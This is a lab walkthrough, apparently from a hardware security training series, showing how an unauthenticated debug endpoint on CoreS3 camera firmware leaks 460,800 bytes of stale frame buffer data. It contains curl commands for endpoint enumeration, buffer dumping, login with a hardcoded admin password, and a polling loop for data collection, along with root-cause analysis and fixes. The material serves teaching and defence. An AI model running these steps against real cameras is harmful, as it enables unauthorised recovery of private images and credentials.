# L16: Camera Buffer Information Leak

## Goal

Extract sensitive data from uninitialized camera frame buffers by exploiting buffer reuse without clearing. A debug endpoint exposes 460,800 bytes of stale frame data to any unauthenticated client.

## Background

### Why this matters

Camera frame buffers in embedded systems are large PSRAM allocations (hundreds of kilobytes). Clearing them between captures costs measurable CPU time, so developers often skip the `memset`. Previous frame data persists and can be read through a debug endpoint, memory dump, or JTAG probe. In surveillance cameras, this means an attacker can recover fragments of previous images: people, documents, security badges, or screens displaying passwords. This is CWE-226 (Sensitive Information in Resource Not Removed Before Reuse).

### What you're looking for

- Debug endpoints exposing raw buffer contents (hex dumps, memory views, frame status pages)
- Use of `malloc()` instead of `calloc()` for frame buffers
- Buffer reuse without clearing between captures (stale data persists across resolution changes)
- Resolution changes that write a smaller image into a buffer sized for a larger one
- Endpoints named `/debug`, `/diag`, `/status`, or `/raw` left in production builds

### Why this happens

- Zeroing a 614,400-byte buffer takes measurable time at 240 MHz, and camera applications are latency-sensitive
- `malloc()` returns uninitialized memory and developers use it by default
- A smaller "preview" frame written into a buffer that held a larger "full" frame leaves the tail of the old frame intact
- Debug endpoints added during development are never removed or protected

### On CoreS3

The firmware allocates a 614,400-byte frame buffer in PSRAM using `malloc()` (enough for 640x480 RGB565). The capture flow:

1. `framebuf_init_full()` allocates the buffer and fills it with `0xAA` (simulating a full-resolution capture)
2. `framebuf_prepare_preview()` overwrites only the first 153,600 bytes (320x240 preview region) with `0xBB`

The remaining 460,800 bytes from offset 153,600 onward still contain the previous `0xAA` pattern. The `/camera/debug-frame` endpoint runs both stages and returns a hex dump at two offsets - exposing the stale data to any unauthenticated HTTP client.

## Hardware Setup

- CoreS3 device powered on and connected via USB (for serial monitoring)
- Computer with WiFi adapter connected to the device's AP
- Terminal with `curl` installed
- Optional: serial terminal for verifying via diagnostic command
- Optional: hex editor or `xxd` for examining raw JPEG snapshots

## Lab Walkthrough

### Step 1: Discover Camera Endpoints

Enumerate HTTP endpoints to find camera-related routes.

```bash
# Probe known camera endpoints
curl -s http://192.168.4.1/snapshot -o /dev/null -w "snapshot: %{http_code}\n"
curl -s http://192.168.4.1/stream -o /dev/null -w "stream: %{http_code}\n"
curl -s http://192.168.4.1/camera -o /dev/null -w "camera: %{http_code}\n"
curl -s http://192.168.4.1/camera/debug-frame -o /dev/null -w "debug-frame: %{http_code}\n"
```

**Expected output:**

```
snapshot: 401
stream: 401
camera: 200
debug-frame: 200
```

The `/camera/debug-frame` endpoint returns HTTP 200 with no authentication. The `/snapshot` endpoint requires JWT (returns 401), but the debug endpoint is wide open.

### Step 2: Examine the Debug Frame Endpoint

Request `/camera/debug-frame` to see the raw frame buffer state with hex-dumped memory contents.

```bash
curl -s http://192.168.4.1/camera/debug-frame
```

**Expected output:**

```
Camera Frame Status
Full frame size: 614400 bytes
Preview frame size: 153600 bytes

Note: previous frame data remains in buffer beyond preview region.
Offset 0x0000: BB BB BB BB BB BB BB BB BB BB BB BB BB BB BB BB
Offset 0x25800: AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA
Previous frame bytes visible after preview region.
```

**Key observations:**
- Full frame buffer: 614,400 bytes (640 x 480 x 2, RGB565)
- Preview frame: 153,600 bytes (320 x 240 x 2, RGB565)
- Offset `0x0000` shows `0xBB` - current preview data (freshly written)
- Offset `0x25800` (decimal 153,600) shows `0xAA` - stale data from the previous full-frame capture

### Step 3: Analyze the Buffer Layout

Calculate how much stale data is exposed. The two distinct byte patterns prove the buffer is not cleared between operations.

```bash
# Save the debug frame output for analysis
curl -s http://192.168.4.1/camera/debug-frame -o debug-frame.txt
cat debug-frame.txt

# Calculate the leak:
# Full frame size:    614,400 bytes
# Preview frame size: 153,600 bytes
# Leaked stale data:  614,400 - 153,600 = 460,800 bytes (75% of buffer!)
```

**Memory layout:**

```
Offset 0x00000 +-----------------------+
               | Preview frame (0xBB)  |  153,600 bytes (25%)
               | Current capture data  |
Offset 0x25800 +-----------------------+
               | STALE DATA (0xAA)     |  460,800 bytes (75%)
               | Previous full frame   |
               | NOT CLEARED!          |
Offset 0x96000 +-----------------------+
                 End of buffer (614,400)
```

The stale region is large enough to reconstruct a partial 640x360 image (230,400 pixels at 2 bytes per pixel in RGB565).

### Step 4: Understand the Root Cause

The firmware uses `malloc()` (uninitialized memory) and reuses the buffer without clearing. After a full-frame capture fills all 614,400 bytes, preview captures only overwrite the first 153,600 bytes.

```
Vulnerable code flow (from CameraDevice_Camera.cpp):

1. framebuf_init_full():
   buffer = malloc(614400)        // No zeroing
   memset(buffer, 0xAA, 614400)   // Simulates full-frame capture

2. framebuf_prepare_preview():
   memset(buffer, 0xBB, 153600)   // Preview overwrites ONLY first 153,600 bytes
                                  // Bytes 153,600 through 614,399 still contain 0xAA!

3. framebuf_capture_debug():
   framebuf_init_full()           // Fill entire buffer with 0xAA
   framebuf_prepare_preview()     // Overwrite first 153,600 with 0xBB

Fix options:
  - Use calloc() instead of malloc()
  - memset(buffer, 0, 614400) before each preview capture
  - Allocate only the exact size needed for the current resolution
  - Remove the debug endpoint from production builds
```

### Step 5: Access JPEG Snapshots for Comparison

Capture a JPEG snapshot through the authenticated `/snapshot` endpoint and examine raw bytes for stale buffer data leaking through JPEG compression.

```bash
# First, get a JWT token by logging in
TOKEN=$(curl -s -X POST http://192.168.4.1/login \
  -d "username=admin&password=CoreS3_Admin_2024!" \
  | grep -oP 'Token: \K.*')

# Capture a snapshot (requires valid JWT)
curl -s "http://192.168.4.1/snapshot?token=$TOKEN" -o snapshot1.jpg
ls -la snapshot1.jpg

# Expected output:
# -rw-r--r-- 1 user user 12847 Mar  9 10:15 snapshot1.jpg

# Look for non-image data patterns in the raw JPEG bytes
xxd snapshot1.jpg | tail -20

# Search for any leaked strings or recognizable patterns
strings snapshot1.jpg | head -20

# Check if there is data after the JPEG EOI (End of Image) marker
# EOI is the byte sequence FF D9
xxd snapshot1.jpg | grep "ff d9"
```

If data appears after the `FF D9` EOI marker, it may be stale buffer content not part of the JPEG image data.

### Step 6: Confirm via Serial Console

Use the serial console to verify the buffer state independently, confirming the leak is in the shared buffer management code and not just the HTTP response.

```bash
pio device monitor -b 115200

cores3-cam> status
# Check "Camera: OK" to confirm the camera is active and capturing frames
```

The same stale buffer is visible through any interface that reads the frame buffer - HTTP, serial, or JTAG. The root cause is in the buffer lifecycle, not in any single endpoint.

### Step 7: Map to Real-World Attack Scenarios

In the lab, placeholder patterns make the vulnerability easy to visualize. In a deployed camera, those bytes would be actual RGB565 pixel data from previous captures.

```
Real-world attack flow:

1. Camera captures sensitive scene (badge, document, password on screen)
   -> Full frame buffer (614,400 bytes) filled with actual pixel data

2. Camera switches to preview mode (lower resolution for live view)
   -> Only first 153,600 bytes overwritten with new preview pixels

3. Attacker requests /camera/debug-frame (no auth required)
   -> Gets hex dump showing new preview + 460,800 bytes of OLD frame data

4. Attacker extracts raw pixel bytes from the stale region
   -> Convert hex values to RGB565 pixels (2 bytes per pixel)
   -> 460,800 bytes = 230,400 pixels = partial 640x360 image

5. Attacker reconstructs previous image from leaked bytes

Additional attack vectors:
- JTAG probe reads entire PSRAM including frame buffers
- Firmware update adds hidden exfiltration endpoint
- BLE or serial interface triggers buffer dump
- Physical access to PSRAM chip
```

### Step 8: Automate Repeated Capture for Maximum Data Recovery

Poll the debug endpoint repeatedly to collect buffer state over time, increasing the chance of recovering meaningful data.

```bash
# Poll the debug-frame endpoint every 5 seconds for 1 minute
for i in $(seq 1 12); do
  echo "=== Capture $i at $(date +%H:%M:%S) ==="
  curl -s http://192.168.4.1/camera/debug-frame
  echo
  sleep 5
done | tee buffer-captures.log

# Analyze captured data for variations
grep "Offset 0x25800" buffer-captures.log
# If the stale bytes change between captures, different previous frames
# are being leaked each time.
```

In this lab the stale pattern is always `0xAA` (fixed pattern). In a real deployment, the bytes at offset `0x25800` would change each time the camera captures a new full-resolution frame.

## Impact

- **Information disclosure**: 460,800 bytes (75%) of the previous frame buffer leak through buffer reuse without clearing
- **Unauthenticated access**: `/camera/debug-frame` requires no authentication
- **Credential exposure**: If the camera previously captured a screen showing passwords or PINs, those pixel values persist in the buffer
- **Surveillance recovery**: An attacker can recover fragments of previous scenes even after the camera switches resolution
- **Multiple attack surfaces**: Same vulnerability accessible via HTTP (`/camera/debug-frame`), serial console, and JTAG
- **Debug endpoint in production**: Compounded by CWE-489 (Active Debug Code) - left in production without authentication

## References

- [CWE-200: Exposure of Sensitive Information to an Unauthorized Actor](https://cwe.mitre.org/data/definitions/200.html)
- [CWE-226: Sensitive Information in Resource Not Removed Before Reuse](https://cwe.mitre.org/data/definitions/226.html)
- [CWE-665: Improper Initialization](https://cwe.mitre.org/data/definitions/665.html)
- [CWE-489: Active Debug Code](https://cwe.mitre.org/data/definitions/489.html)
- [ESP32-S3 PSRAM Documentation](https://docs.espressif.com/projects/esp-idf/en/latest/esp32s3/api-reference/peripherals/spi_flash.html)
- [OWASP - Information Disclosure](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/)
- [RGB565 Pixel Format Reference](https://en.wikipedia.org/wiki/High_color)
